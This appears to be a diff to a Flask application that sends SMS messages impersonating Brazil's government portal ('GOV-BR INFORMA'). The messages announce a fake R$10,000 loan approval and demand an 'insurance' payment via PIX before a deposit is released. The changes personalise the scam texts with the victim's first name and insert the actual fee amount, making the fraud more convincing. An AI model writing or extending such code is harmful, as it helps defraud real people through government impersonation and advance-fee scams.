@@ -39,12 +39,15 @@ def send_verification_code_smsdev(phone_number: str, verification_code: str) -> 
             app.logger.error("SMSDEV_API_KEY not found in environment variables")
             return False, "API key not configured"
 
+        # Extract name from phone_number if available (format: "phone|name")
+        parts = phone_number.split('|')
+        actual_phone = parts[0]
+        first_name = parts[1] if len(parts) > 1 else "Cliente"
+
         # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
+        formatted_phone = re.sub(r'\D', '', actual_phone)
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
-            # Get first name (using "Cliente" as default)
-            first_name = "Cliente"
             # Message template
             message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R$10.000,00 foi aprovado. Seu código de verificação é: {verification_code}."
 
@@ -90,11 +93,15 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
         formatted_phone = re.sub(r'\D', '', phone_number)
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
+            # Extract name from phone_number if available (format: "phone|name")
+            parts = phone_number.split('|')
+            actual_phone = parts[0]
+            first_name = parts[1] if len(parts) > 1 else "Cliente"
+            
             # Format as international number with Brazil code
+            formatted_phone = re.sub(r'\D', '', actual_phone)
             international_number = f"55{formatted_phone}"
-
-            # Get first name (using "Cliente" as default)
-            first_name = "Cliente"
+            
             # Message template
             message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R$10.000,00 foi aprovado. Seu código de verificação é: {verification_code}."
 
@@ -291,7 +298,8 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
 
         # Message template
         emprestimo_valor = 10000.00
-        message = f"TRANSFERENCIA PIX: um deposito no valor de R${emprestimo_valor:.2f} foi agendado para sua conta. Realize o pagamento do seguro no valor de R$54,90 para receber a transferencia agora."
+        seguro_valor = amount  # Use o valor real do seguro
+        message = f"TRANSFERENCIA PIX: um deposito no valor de R${emprestimo_valor:.2f} foi agendado para sua conta. Realize o pagamento do seguro no valor de R${seguro_valor:.2f} para receber a transferencia agora."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
@@ -589,11 +597,19 @@ def send_verification_code_route():
     try:
         data = request.json
         phone_number = data.get('phone')
+        name = data.get('name', '')
+        
+        # Append the name to the phone number for later use in the SMS message
+        if name:
+            first_name = name.split()[0] if name else "Cliente"
+            phone_with_name = f"{phone_number}|{first_name}"
+        else:
+            phone_with_name = phone_number
 
         if not phone_number:
             return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400
 
-        success, result = send_verification_code(phone_number)
+        success, result = send_verification_code(phone_with_name)
 
         if success:
             # Store the verification code temporarily (in a real app, this should use Redis or similar)
